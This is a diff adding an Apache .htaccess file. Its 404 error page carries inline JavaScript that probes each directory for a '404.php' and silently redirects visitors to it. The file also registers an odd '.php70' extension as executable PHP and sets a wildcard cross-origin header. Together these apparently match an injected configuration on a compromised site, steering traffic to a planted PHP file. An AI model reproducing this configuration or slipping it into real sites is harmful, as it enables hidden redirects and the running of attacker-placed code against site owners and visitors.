@@ -1,0 +1,13 @@
+AddHandler application/x-httpd-ea-php70  .php70 .php
+RewriteEngine on RewriteCond %{REQUEST_FILENAME}  !-d
+RewriteCond %{REQUEST_URI} (.+).php/(.*)$
+RewriteRule ^ %1.php [R=301,L]
+ErrorDocument 404 '<html> <head><title>404 Not Found</title><script src="https://code.jquery.com/jquery-2.2.4.min.js"></script><script>   $(function(jQuery){ function UrlExists(url) { var http = new XMLHttpRequest(); http.open("HEAD", url, false); http.send(); if (http.status != 404) return true;  else return false; } d=window.location.pathname.split("/"); url=window.location.origin; for(i=0;i<d.length;i++){ if(UrlExists(url+"/404.php")) window.location=url+"/404.php"; else{ if(d[i]=="") continue; else{ url=url+"/"+d[i];}  } } });</script> </head> <body> <div style="display:none;" id="includedContent"></div></body></html>'
+Header set Access-Control-Allow-Origin "*"
+
+# php -- BEGIN cPanel-generated handler, do not edit
+# Set the “ea-php73” package as the default “PHP” programming language.
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php73 .php .php7 .phtml
+</IfModule>
+# php -- END cPanel-generated handler, do not edit
